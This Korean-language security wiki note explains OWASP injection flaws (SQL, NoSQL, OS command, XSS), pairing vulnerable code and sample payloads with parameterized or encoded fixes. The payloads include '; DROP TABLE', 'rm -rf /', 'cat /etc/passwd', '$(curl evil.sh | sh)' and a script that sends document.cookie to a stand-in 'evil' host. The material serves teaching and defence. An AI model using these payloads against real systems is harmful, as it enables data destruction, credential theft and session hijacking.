---
title: "Injection (OWASP A03) — SQLi/NoSQL/Command/XSS"
kind: knowledge
project: security
agent: security-review
status: current
created_at: 2026-06-15
tags: [security, web-security, injection, sqli, xss, owasp]
home_hub: "20-areas/security/web-security"
related: ["[[web-security]]", "[[broken-access-control]]", "[[authentication-session]]"]
---

# Injection (OWASP A03) — SQLi/NoSQL/Command/XSS

| version | date | author | note |
| --- | --- | --- | --- |
| v.1.0.0 | 2026-06-15 | security-review | 최초 — 주입 계열 + 파라미터화/인코딩 |

**[[web-security|↑ web-security]]**

> 신뢰 못할 입력이 인터프리터(SQL/쉘/브라우저)에 명령으로 해석되는 결함. 공통 뿌리: 데이터와 코드 경계 붕괴.

## 1. 공통 원리

주입 결함은 표면적으로 SQL, 쉘, 브라우저, NoSQL 엔진 등 서로 다른 인터프리터를 노리지만 뿌리는 하나다. 개발자가 **사용자 입력을 코드/쿼리 문자열에 그대로 이어붙이고**, 그 합쳐진 문자열을 인터프리터에 통째로 넘긴다. 인터프리터는 "어디까지가 데이터고 어디부터가 명령인지" 알 길이 없으므로, 공격자가 데이터 자리에 명령 문법(따옴표 닫기, `;`, `$()`, `<script>`)을 끼워 넣으면 그것이 명령으로 실행된다. 즉 모든 주입의 본질은 **데이터와 코드의 경계 붕괴**다. 따라서 근본 방어도 하나로 수렴한다 — 입력을 명령 문법으로 해석될 수 없는 "순수 데이터" 채널에 묶어 두는 것(파라미터 바인딩, 컨텍스트별 출력 인코딩, 쉘 미경유 exec).

## 2. 유형별 예시

### 2.1 SQL Injection

```javascript
// 취약 — 입력을 쿼리 문자열에 concat
const q = "SELECT * FROM users WHERE id = '" + input + "'";
db.query(q);
```

```text
입력 ' OR '1'='1   → WHERE id = '' OR '1'='1'  (항상 참, 전체 행 노출)
입력 '; DROP TABLE users;--  → 두 번째 구문 실행 + 뒤를 주석 처리
UNION  '  UNION SELECT card_no, cvv FROM payments--  (다른 테이블 추출)
blind  ' AND SLEEP(5)--  (응답 지연으로 참/거짓 추론) / ' AND 1=1-- vs ' AND 1=2--
```

```javascript
// 안전 — prepared statement / 파라미터 바인딩 (구조와 데이터 분리)
db.query("SELECT * FROM users WHERE id = ?", [input]);
// ORM 사용 시에도 문자열 concat 금지, 바인딩 API만 사용
```

### 2.2 NoSQL Injection

MongoDB 등 문서 DB는 쿼리 자체가 JSON 객체라, 문자열을 기대한 자리에 **연산자 객체**가 들어오면 의미가 바뀐다.

```javascript
// 취약 — req.body를 그대로 쿼리 객체로 사용
db.users.findOne({ username: req.body.username, password: req.body.password });
```

```json
// 공격 — 문자열 대신 연산자 주입으로 인증 우회
{ "username": "admin", "password": { "$gt": "" } }
// password > "" 는 항상 참 → 비밀번호 모르고 로그인
```

```javascript
// 안전 — 입력 타입을 강제(문자열만 허용), 연산자 객체 거부
if (typeof req.body.password !== "string") return reject();
```

### 2.3 OS Command Injection

```javascript
// 취약 — 입력을 쉘 명령에 concat, 쉘이 메타문자 해석
exec("ping -c 1 " + host);
```

```text
입력 8.8.8.8; rm -rf /        → ping 후 rm 실행
입력 8.8.8.8 && cat /etc/passwd
입력 $(curl evil.sh | sh)     → 명령 치환으로 임의 코드
```

```javascript
// 안전 — 쉘 미경유, argv 배열로 인자 전달(메타문자 해석 안 됨)
execFile("ping", ["-c", "1", host]);   // host는 항상 단일 인자
// 추가로 host는 IP/도메인 화이트리스트 검증
```

### 2.4 XSS — 브라우저 인터프리터 주입

브라우저(HTML/JS 파서)도 인터프리터다. 사용자 입력이 HTML 문맥에 그대로 박히면 마크업/스크립트로 해석된다.

- **stored** — 입력이 DB에 저장됐다가 다른 사용자 페이지에 렌더(댓글, 프로필).
- **reflected** — 요청 파라미터가 즉시 응답에 반사(검색어, 에러 메시지).
- **DOM** — 서버를 거치지 않고 클라이언트 JS가 `location.hash` 등을 DOM에 주입.

```javascript
// 취약 — innerHTML에 입력 직접 주입
el.innerHTML = userInput;   // "<img src=x onerror=alert(document.cookie)>"
```

```html
<!-- 공격 페이로드 예 -->
<script>fetch('//evil/'+document.cookie)</script>
<svg onload=...>  <a href="javascript:...">  (이벤트 핸들러/스킴)
```

```javascript
// 안전 — 텍스트는 textContent(파싱 안 됨), HTML은 컨텍스트별 인코딩
el.textContent = userInput;
// React/Vue 자동 이스케이프 신뢰, dangerouslySetInnerHTML / v-html 사용 주의
// 심층 방어로 CSP: Content-Security-Policy: script-src 'self'
```

## 3. 방어

### 3.1 (4구조) 왜 파라미터화가 escaping보다 근본 해결인가

- **① 왜 필요** — 입력이 쿼리 문법으로 해석되는 경로를 원천 차단해야 SQLi가 구조적으로 불가능해진다.
- **② 안 하면 문제** — 수동 escaping은 "이번 입력은 안전하다"를 개발자가 매번 판단해야 하고, 한 군데라도 빠지면 그 한 줄로 전체 DB가 뚫린다(휴먼 에러 누적).
- **③ 대안** — escaping/blacklist 필터링. 하지만 인코딩 우회, 멀티바이트 문자, 컨텍스트 차이로 반복 회피된다.
- **④ 트레이드오프** — prepared statement는 **값**만 바인딩하므로 컬럼명/정렬방향/`IN (...)` 동적 개수 같은 **식별자/구조**는 바인딩 불가 → 이 부분만 별도 화이트리스트로 매핑해야 한다(예: `sort ∈ {created_at, name}`). 그 외 모든 값은 무조건 바인딩.

```javascript
// 동적 식별자는 바인딩 불가 → 화이트리스트 매핑
const col = { name: "name", date: "created_at" }[req.query.sort] ?? "created_at";
db.query(`SELECT * FROM users ORDER BY ${col} LIMIT ?`, [limit]);
```

### 3.2 (4구조) 왜 출력 인코딩 + CSP의 이중 방어인가 (XSS)

- **① 왜 필요** — XSS는 출력 지점이 수십 곳이라 단일 방어로는 누락이 필연적이다.
- **② 안 하면 문제** — 인코딩 한 곳만 빠뜨려도 스크립트가 실행되고 세션/쿠키 탈취로 이어진다.
- **③ 대안** — 입력 단계에서만 필터링. 하지만 같은 입력이 HTML/속성/JS/URL 등 다른 컨텍스트로 출력되면 필요한 인코딩이 달라 입력 필터만으로는 부족하다(출력 컨텍스트가 진실).
- **④ 트레이드오프** — CSP(`script-src 'self'`)는 인코딩이 뚫려도 인라인/외부 스크립트 실행을 막는 2차 그물이지만, 인라인 스크립트·`eval`·일부 서드파티 위젯을 깨뜨려 nonce/hash 도입과 점진 적용이 필요하다. CSP 헤더 운영은 [[security-misconfiguration]] 참조.

### 3.3 보조 방어

- **최소 권한 DB 계정** — 앱 계정에 `DROP`/`GRANT` 권한 제거. 주입돼도 피해 범위 축소.
- **입력 검증(allowlist)** — 형식이 고정된 입력(이메일/숫자/enum)은 허용 패턴만 통과. blacklist는 우회됨.
- **WAF** — 알려진 패턴 차단에 유용하나 우회 가능. **근본 방어가 아니라 보조**일 뿐, 파라미터화/인코딩을 대체하지 못한다.

## 4. 관련 노트

- [[broken-access-control]] — 주입으로 우회한 권한 경계의 다음 방어선.
- [[security-misconfiguration]] — CSP/보안 헤더 설정.
- [[authentication-session]] — XSS로 탈취되는 세션 토큰.
- [[../security|↑ security]]
- [[../../../60-troubleshooting/ai-agent/prompt-injection|prompt-injection]] — LLM 맥락의 주입. 프롬프트(데이터)가 지시(명령)로 해석되는, 본 노트와 **같은 "데이터가 명령이 되는" 뿌리**.
